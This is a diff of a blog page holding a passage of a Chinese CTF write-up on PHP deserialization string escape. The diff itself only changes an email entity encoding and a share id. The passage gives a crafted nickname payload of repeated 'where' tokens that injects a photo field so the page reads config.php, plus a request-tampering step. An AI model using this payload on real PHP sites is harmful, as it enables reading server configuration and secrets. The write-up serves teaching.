@@ -126,7 +126,7 @@
 <p>可以看到update中只有nickename 可以用数组绕过</p>
 <p>序列化完成后进入 profile.php 页面</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$profile[&#x27;phone&#x27;]=&#x27;12345678901&#x27;;</span><br><span class="line">$profile[&#x27;email&#x27;]=&#x27;123@123.com&#x27;;</span><br><span class="line">$profile[&#x27;nickname&#x27;]=[&#x27;a&#x27;];</span><br><span class="line">$profile[&#x27;photo&#x27;]=&#x27;config.com&#x27;;</span><br><span class="line">echo serialize($profile);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>a:4:{s:5:”phone”;s:11:”12345678901”;s:5:”email”;s:11:”<a href="mailto:&#x31;&#x32;&#x33;&#x40;&#x31;&#x32;&#x33;&#x2e;&#99;&#x6f;&#x6d;">&#x31;&#x32;&#x33;&#x40;&#x31;&#x32;&#x33;&#x2e;&#99;&#x6f;&#x6d;</a>“;s:8:”nickname”;a:1:{i:0;s:8:””nickname;}s:5:”photo”;s:10:”config.com”;}<br>需要逃逸 “;}s:5:”photo”;s:10:”config.com”;} 共34 位<br>因此构造nickname=<br>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere”;}s:5:”photo”;s:10:”config.php”;}<br>profile页面中会先在class.php中会将where替换成hacker<br>再反序列化profile  多出34位 使最后34位逃逸到下一 photo </p>
+<p>a:4:{s:5:”phone”;s:11:”12345678901”;s:5:”email”;s:11:”<a href="mailto:&#x31;&#50;&#x33;&#x40;&#49;&#x32;&#51;&#x2e;&#x63;&#111;&#109;">&#x31;&#50;&#x33;&#x40;&#49;&#x32;&#51;&#x2e;&#x63;&#111;&#109;</a>“;s:8:”nickname”;a:1:{i:0;s:8:””nickname;}s:5:”photo”;s:10:”config.com”;}<br>需要逃逸 “;}s:5:”photo”;s:10:”config.com”;} 共34 位<br>因此构造nickname=<br>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere”;}s:5:”photo”;s:10:”config.php”;}<br>profile页面中会先在class.php中会将where替换成hacker<br>再反序列化profile  多出34位 使最后34位逃逸到下一 photo </p>
 <p>注意需要抓包修改 nickname 为 nickname[]</p>
 <p>得到base 64 编码后的flag</p>
 <p>总结：<br>  1.为什么要字符逃逸 只能间接控制到某一个变量<br>  2.如何字符逃逸 运动filter函数的替换</p>
@@ -150,7 +150,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/08/26/php%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="ckst16xey0000x0uwaxgxgvip" data-title="php反序列化总结" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/08/26/php%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="ckuy1ousz0000jsuwgdir499b" data-title="php反序列化总结" class="article-share-link">Share</a>
       
       
       
